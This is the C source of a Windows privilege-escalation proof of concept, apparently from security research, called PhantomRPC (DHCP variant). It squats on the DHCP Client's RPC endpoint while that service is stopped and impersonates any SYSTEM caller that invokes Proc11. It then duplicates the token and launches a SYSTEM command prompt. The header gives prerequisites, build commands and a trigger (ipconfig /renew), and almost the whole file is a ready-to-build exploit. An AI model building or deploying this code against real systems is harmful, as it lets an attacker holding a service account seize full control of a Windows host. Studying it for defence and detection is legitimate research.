/*
 * PhantomRPC POC — DHCP (dhcpcsvc6) variant
 *
 * Attack scenario: DHCP Client service coercion
 * ─────────────────────────────────────────────────────────────────────────────
 * Prerequisites:
 *   1. Attacker has SeImpersonatePrivilege.
 *   2. DHCP Client service (Dhcp) is stopped or disabled.
 *
 * Steps:
 *   1. Compile this server (see BUILD section below).
 *   2. Run it from an account with SeImpersonatePrivilege.
 *   3. Any SYSTEM-level caller that invokes Proc11 on endpoint "dhcpcsvc6"
 *      triggers RpcImpersonateClient() and spawns a SYSTEM cmd.exe.
 *
 * BUILD:
 *   midl ExampleInterface.idl /app_config
 *   cl.exe server.c ExampleInterface_s.c ^
 *       /link rpcrt4.lib advapi32.lib userenv.lib wtsapi32.lib
 *
 * Source: Kaspersky klsecservices/PhantomRPC (MIT), Black Hat Asia 2026.
 * ─────────────────────────────────────────────────────────────────────────────
 * FOR AUTHORIZED SECURITY RESEARCH ONLY.
 */

#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <rpc.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "ExampleInterface.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "wtsapi32.lib")

/* ── Logging ─────────────────────────────────────────────────────────────── */

#define LOG_FILE "C:\\Windows\\Temp\\PhantomRPC_DHCP.log"

static void LogMessage(const char *fmt, ...) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;
    va_list args;
    va_start(args, fmt);
    vfprintf(fp, fmt, args);
    va_end(args);
    fprintf(fp, "\n");
    fflush(fp);
    fclose(fp);
}

/* ── One-shot gate ───────────────────────────────────────────────────────── */

/*
 * The DHCP trigger may fire Proc11 multiple times. The atomic flag ensures
 * we only impersonate and spawn on the first successful call.
 */
static volatile LONG g_fired = 0;

/* ── Privilege check ─────────────────────────────────────────────────────── */

static BOOL HasSeImpersonatePrivilege(void) {
    HANDLE hToken = NULL;
    LUID luid = {0};
    PRIVILEGE_SET privSet = {0};
    BOOL hasPriv = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    if (LookupPrivilegeValueW(NULL, L"SeImpersonatePrivilege", &luid)) {
        privSet.PrivilegeCount = 1;
        privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
        privSet.Privilege[0].Luid = luid;
        privSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
        PrivilegeCheck(hToken, &privSet, &hasPriv);
    }

    CloseHandle(hToken);
    return hasPriv;
}

/* ── Service state check ─────────────────────────────────────────────────── */

static BOOL IsServiceRunning(const wchar_t *serviceName) {
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return FALSE;

    SC_HANDLE hSvc = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD needed = 0;
    BOOL running = FALSE;

    if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                             (LPBYTE)&ssp, sizeof(ssp), &needed))
        running = (ssp.dwCurrentState == SERVICE_RUNNING);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return running;
}

/* ── Token helpers ───────────────────────────────────────────────────────── */

static BOOL IsSystemToken(HANDLE hToken) {
    DWORD cb = 0;
    PTOKEN_USER pUser = NULL;
    BYTE  sysSidBuf[SECURITY_MAX_SID_SIZE];
    DWORD sysSidSize = sizeof(sysSidBuf);
    BOOL  result = FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &cb);
    pUser = (PTOKEN_USER)LocalAlloc(LPTR, cb);
    if (!pUser) return FALSE;

    if (GetTokenInformation(hToken, TokenUser, pUser, cb, &cb)) {
        if (CreateWellKnownSid(WinLocalSystemSid, NULL, sysSidBuf, &sysSidSize))
            result = EqualSid(pUser->User.Sid, (PSID)sysSidBuf);
    }
    LocalFree(pUser);
    return result;
}

/* Log the account name associated with a token SID for demo/audit output. */
static void LogTokenIdentity(HANDLE hToken) {
    DWORD cb = 0;
    PTOKEN_USER pUser = NULL;
    wchar_t name[256] = {0}, domain[256] = {0};
    DWORD nameLen = 256, domainLen = 256;
    SID_NAME_USE sidUse;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &cb);
    pUser = (PTOKEN_USER)LocalAlloc(LPTR, cb);
    if (!pUser) return;

    if (GetTokenInformation(hToken, TokenUser, pUser, cb, &cb)) {
        if (LookupAccountSidW(NULL, pUser->User.Sid,
                              name, &nameLen, domain, &domainLen, &sidUse))
            LogMessage("[+] Captured token identity: %ls\\%ls", domain, name);
        else
            LogMessage("[+] Captured token (LookupAccountSid failed: %lu)", GetLastError());
    }
    LocalFree(pUser);
}

static void SpawnCmdWithSystemToken(HANDLE hImpersonationToken) {
    HANDLE hPrimary = NULL;
    DWORD  dwSession = WTSGetActiveConsoleSessionId();
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    LPVOID lpEnv = NULL;

    if (!DuplicateTokenEx(hImpersonationToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hPrimary)) {
        LogMessage("[-] DuplicateTokenEx failed: %lu", GetLastError());
        return;
    }

    if (IsSystemToken(hImpersonationToken)) {
        /* Redirect into active session so cmd.exe is visible on the desktop */
        if (!SetTokenInformation(hPrimary, TokenSessionId,
                                 &dwSession, sizeof(DWORD))) {
            LogMessage("[-] SetTokenInformation failed: %lu", GetLastError());
            CloseHandle(hPrimary);
            return;
        }
        LogMessage("[+] Token redirected to console session %lu", (unsigned long)dwSession);
    }

    if (!CreateEnvironmentBlock(&lpEnv, hPrimary, TRUE)) {
        LogMessage("[-] CreateEnvironmentBlock failed: %lu", GetLastError());
        CloseHandle(hPrimary);
        return;
    }

    if (!CreateProcessAsUserW(hPrimary,
                              L"C:\\Windows\\System32\\cmd.exe",
                              NULL, NULL, NULL, FALSE,
                              CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                              lpEnv, NULL, &si, &pi)) {
        LogMessage("[-] CreateProcessAsUserW failed: %lu", GetLastError());
    } else {
        LogMessage("[+] cmd.exe spawned (PID %lu)", (unsigned long)pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    DestroyEnvironmentBlock(lpEnv);
    CloseHandle(hPrimary);
}

static void ImpersonateAndRunCmd(void) {
    HANDLE hToken = NULL;

    /* Atomic one-shot: skip duplicate calls from the same trigger event */
    if (InterlockedCompareExchange(&g_fired, 1, 0) != 0) {
        LogMessage("[*] ImpersonateAndRunCmd: already fired — skipping duplicate call");
        return;
    }

    LogMessage("[*] ImpersonateAndRunCmd: RPC client connected — attempting impersonation");

    if (RpcImpersonateClient(NULL) != RPC_S_OK) {
        LogMessage("[-] RpcImpersonateClient failed: %lu", GetLastError());
        InterlockedExchange(&g_fired, 0);
        return;
    }
    LogMessage("[+] RpcImpersonateClient succeeded");

    if (!OpenThreadToken(GetCurrentThread(),
                         TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                         FALSE, &hToken)) {
        LogMessage("[-] OpenThreadToken failed: %lu", GetLastError());
        RpcRevertToSelf();
        InterlockedExchange(&g_fired, 0);
        return;
    }

    LogTokenIdentity(hToken);
    SpawnCmdWithSystemToken(hToken);
    CloseHandle(hToken);

    if (RpcRevertToSelf() != RPC_S_OK)
        LogMessage("[-] RpcRevertToSelf failed");
    else
        LogMessage("[+] RpcRevertToSelf succeeded");

    LogMessage("[*] ImpersonateAndRunCmd: done");
}

/* ── Console Ctrl handler ────────────────────────────────────────────────── */

static BOOL WINAPI CtrlHandler(DWORD dwCtrlType) {
    if (dwCtrlType == CTRL_C_EVENT || dwCtrlType == CTRL_BREAK_EVENT ||
        dwCtrlType == CTRL_CLOSE_EVENT) {
        LogMessage("[*] Shutdown signal received — stopping RPC listener");
        RpcMgmtStopServerListening(NULL);
        return TRUE;
    }
    return FALSE;
}

/* ── RPC procedure stubs ─────────────────────────────────────────────────── */

long Proc0(void)  { return RPC_S_OK; }
long Proc1(void)  { return RPC_S_OK; }
long Proc2(void)  { return RPC_S_OK; }
long Proc3(void)  { return RPC_S_OK; }
long Proc4(void)  { return RPC_S_OK; }
long Proc5(void)  { return RPC_S_OK; }
long Proc6(void)  { return RPC_S_OK; }
long Proc7(void)  { return RPC_S_OK; }
long Proc8(void)  { return RPC_S_OK; }
long Proc9(void)  { return RPC_S_OK; }
long Proc10(void) { return RPC_S_OK; }

/*
 * Proc11 — the impersonation trigger for the DHCP scenario.
 * Called by a SYSTEM-level process targeting the DHCP Client interface.
 */
long Proc11(wchar_t *arg_0, struct Struct_690_t *arg_1) {
    LogMessage("[*] Proc11 called (arg_0=%ls)", arg_0 ? arg_0 : L"<null>");
    ImpersonateAndRunCmd();
    return RPC_S_OK;
}

long Proc12(void) { return RPC_S_OK; }
long Proc13(void) { return RPC_S_OK; }

/* ── Entry point ─────────────────────────────────────────────────────────── */

int main(void) {
    RPC_STATUS status;

    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    LogMessage("=== PhantomRPC DHCP POC starting ===");

    if (!HasSeImpersonatePrivilege()) {
        LogMessage("[-] SeImpersonatePrivilege not held — cannot proceed");
        LogMessage("    Run as NETWORK SERVICE, LOCAL SERVICE, or a service account.");
        return ERROR_PRIVILEGE_NOT_HELD;
    }
    LogMessage("[+] SeImpersonatePrivilege confirmed");

    if (IsServiceRunning(L"Dhcp")) {
        LogMessage("[!] WARNING: Dhcp service is Running — endpoint 'dhcpcsvc6' is already");
        LogMessage("    occupied. Stop it first: sc stop Dhcp");
        LogMessage("    Proceeding anyway (RpcServerUseProtseqEpW will likely fail).");
    } else {
        LogMessage("[+] Dhcp service is not running — endpoint is available");
    }

    status = RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncalrpc",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_WSTR)L"dhcpcsvc6",
        NULL);
    if (status) {
        LogMessage("[-] RpcServerUseProtseqEpW failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] Endpoint 'dhcpcsvc6' registered");

    status = RpcServerRegisterIf2(
        ExampleInterface_v1_0_s_ifspec,
        NULL, NULL,
        0,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        (unsigned)-1,
        NULL);
    if (status) {
        LogMessage("[-] RpcServerRegisterIf2 failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] Interface registered (UUID 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0)");

    status = RpcServerRegisterAuthInfoW(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
    if (status) {
        LogMessage("[-] RpcServerRegisterAuthInfoW failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] NTLM auth info registered");
    LogMessage("[*] Waiting — trigger with: ipconfig /renew  (from elevated prompt)");
    LogMessage("[*] Press Ctrl+C to stop cleanly.");

    status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
    if (status && status != RPC_S_SERVER_UNAVAILABLE) {
        LogMessage("[-] RpcServerListen failed: 0x%lx", status);
        return (int)status;
    }

    LogMessage("[*] Server stopped cleanly.");
    return 0;
}

/* ── MIDL memory helpers ─────────────────────────────────────────────────── */

void *__RPC_USER midl_user_allocate(size_t size) { return malloc(size); }
void  __RPC_USER midl_user_free(void *ptr)        { free(ptr); }
